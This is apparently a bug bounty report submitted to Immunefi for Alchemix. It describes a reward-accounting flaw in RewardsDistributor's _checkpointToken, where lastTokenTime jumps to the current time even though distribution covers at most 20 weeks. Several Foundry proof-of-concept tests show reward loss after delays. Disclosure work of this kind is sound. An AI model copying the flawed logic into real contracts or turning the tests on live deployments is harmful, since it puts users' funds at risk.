# 31559 - \[SC - Low] Minter UpdatePeriod after weeks causes Rewards...

Submitted on May 21st 2024 at 10:20:50 UTC by @copperscrewer for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31559

Report type: Smart Contract

Report severity: Low

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RewardsDistributor.sol>

Impacts:

* Permanent freezing of unclaimed royalties
* Permanent freezing of unclaimed yield

## Description

## Brief/Intro

The Minter is a contract that calls UpdatedPeriod which then updates rewards to claim in tokensPerWeek in Rewards Distributor

In \_checkpointToken The hard cap of 20 weeks and the invalid updation of lastTokenTime to block.timestamp, allows direct loss of rewards proportional to amount of time elapsed from the 20 weeks mark.

## Vulnerability Details

Minter UpdatePeriod after 20 weeks causes RewardsDistributor contract to lose claimable amount. The Rewards Distributor Contract has a claim function for a token id where it distributes rewards to the holder, however the rewards are only captured till 20 weeks from last updated epoch and set to the current block.timestamp despite only updating 20 weeks from lastTokenTime.

This is in contrast to the 255 weeks limit in Voting escrow as the number of weeks are just 20 for the exploit to damage the protocol, and there are no associated complexities in carrying out the attack.

```solidiity
    function _checkpointToken() internal {
    .
    lastTokenTime = block.timestamp; 
    //@audit wrong as it's not calculated till block.timestamp, It should cover only till where it updated 
    .
    for (uint256 i = 0; i < 20; i++) { 
    //@audit limit 20 is fine but the former incorrectly updates lastTokenTime 
to block.timestamp
    .
    tokensPerWeek[thisWeek] += (toDistribute * (nextWeek - t)) / sinceLast;
    .
    }


```

Since the rewards are not entered correctly, the protocol permanently loses the rewards to distribute to the user.

## Impact Details

The impact is that the user will permanently lose rewards, and the exploit can be as easy as 20 weeks of negligence and no added complexity to carry out the attack.

## Proof of Concept

Copy paste the following code in Minter.t.sol and execute the following command `forge test --match-test testtokensPerWeekPOC* --fork-url https://eth-mainnet.alchemyapi.io/v2/[API_KEY] -vvv`

```solidity
    function testtokensPerWeekPOC() external 
    {
        console.log("Block timestamp : ", block.timestamp);
        console.log("minter active period : ", minter.activePeriod() );

        uint256 activePeriodThen = minter.activePeriod();
        hevm.warp(activePeriodThen + 20 weeks); 

        //ROUND1        
        hevm.startPrank(address(voter));

        minter.updatePeriod(); // deposits alcx to Distributor
        hevm.stopPrank();

        //We prank veALCX for POC reasons
        hevm.startPrank(address(veALCX));

        uint256 claimedAmount = distributor.claim(1, false);
        console.log("Claimed amount @ 20 weeks : ", claimedAmount);       

    }

    function testtokensPerWeekPOC18() external 
    {
        console.log("Block timestamp : ", block.timestamp);
        console.log("minter active period : ", minter.activePeriod() );

        uint256 activePeriodThen = minter.activePeriod();
        hevm.warp(activePeriodThen + 18 weeks);

        //ROUND1        
        hevm.startPrank(address(voter));

        minter.updatePeriod(); // deposits alcx to Distributor
        hevm.stopPrank();

        //We prank veALCX for POC reasons
        hevm.startPrank(address(veALCX));

        uint256 claimedAmount = distributor.claim(1, false);
        console.log("Claimed amount @ 18 weeks : ", claimedAmount);       

    }

    function testtokensPerWeekPOC10() external 
    {
        console.log("Block timestamp : ", block.timestamp);
        console.log("minter active period : ", minter.activePeriod() );

        uint256 activePeriodThen = minter.activePeriod();
        hevm.warp(activePeriodThen + 10 weeks); 

        //ROUND1        
        hevm.startPrank(address(voter));

        minter.updatePeriod(); // deposits alcx to Distributor
        hevm.stopPrank();

        //We prank veALCX for POC reasons
        hevm.startPrank(address(veALCX));

        uint256 claimedAmount = distributor.claim(1, false);
        console.log("Claimed amount @ 10 weeks : ", claimedAmount);       

    }

    function testtokensPerWeekPOC22() external 
    {
        console.log("\nBlock timestamp : ", block.timestamp);
        console.log("minter active period : ", minter.activePeriod() );

        uint256 activePeriodThen = minter.activePeriod();
        hevm.warp(activePeriodThen + 22 weeks); 

        //ROUND1        
        hevm.startPrank(address(voter));

        minter.updatePeriod(); // deposits alcx to Distributor
        hevm.stopPrank();

        //We prank veALCX for POC reasons
        hevm.startPrank(address(veALCX));

        uint256 claimedAmount = distributor.claim(1, false);
        console.log("Claimed amount @ 22 weeks : ", claimedAmount);       
        

    }

    function testtokensPerWeekPOC30() external 
    {
        console.log("\nBlock timestamp : ", block.timestamp);
        console.log("minter active period : ", minter.activePeriod() );

        uint256 activePeriodThen = minter.activePeriod();
        hevm.warp(activePeriodThen + 30 weeks); 

        //ROUND1        
        hevm.startPrank(address(voter));

        minter.updatePeriod(); // deposits alcx to Distributor
        hevm.stopPrank();

        //We prank veALCX for POC reasons
        hevm.startPrank(address(veALCX));

        uint256 claimedAmount = distributor.claim(1, false);
        console.log("Claimed amount @ 30 weeks : ", claimedAmount);  

        claimedAmount = distributor.claim(1, false);
        console.log("Claimed again : ", claimedAmount);  
    }
```
